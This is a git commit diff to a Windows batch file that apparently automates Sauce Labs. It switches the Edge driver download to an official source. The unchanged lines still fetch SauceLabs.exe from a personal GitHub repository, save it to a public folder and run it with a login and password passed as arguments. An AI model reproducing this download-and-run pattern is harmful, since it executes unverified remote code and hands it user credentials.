2277acc0fb411e054d19950929adec362631655d
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-02-15 15:00:29 -0300

    aksdjsald

--- runsauceinlabs.bat
+++ runsauceinlabs.bat
@@ -1,5 +1,6 @@
 set lg=%1
 set psw=%2
-powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/msedgedriver.exe" -OutFile "C:\Users\Public\Downloads\msedgedriver.exe"
+powershell Invoke-WebRequest -Uri "https://msedgedriver.azureedge.net/100.0.1154.0/edgedriver_win32.zip" -OutFile "C:\Users\Public\Downloads\edgedriver.zip"
+powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\edgedriver.zip -DestinationPath C:\Users\Public\Downloads
 powershell Invoke-WebRequest -Uri "https://raw.githubusercontent.com/marinabarros320168/new/main/SauceLabs.exe" -OutFile "C:\Users\Public\Downloads\saucelabs.exe"
 C:\Users\Public\Downloads\saucelabs.exe -e %lg% -p %psw%
